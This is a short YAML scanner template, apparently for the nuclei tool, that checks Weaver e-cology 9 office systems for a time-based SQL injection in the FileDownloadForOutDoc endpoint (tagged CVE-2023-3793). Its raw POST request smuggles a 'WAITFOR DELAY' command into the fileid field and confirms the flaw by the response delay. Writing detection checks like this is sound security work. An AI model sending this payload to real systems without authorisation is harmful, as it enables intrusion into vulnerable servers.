id: poc-yaml-weaver-e-cology-filedownloadforoutdoc-sqli
info:
  name: 泛微e-cology9协同办公系统 FileDownloadForOutDoc SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: CVE-2023-3793,sql-injection,两高一弱

variables:
  t1: "{{rand_int(5, 10)}}"

http:
  - raw:
      - |
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        fileid=2+WAITFOR+DELAY+'0:0:{{t1}}'&isFromOutImg=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "ecology_JSessionid="
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
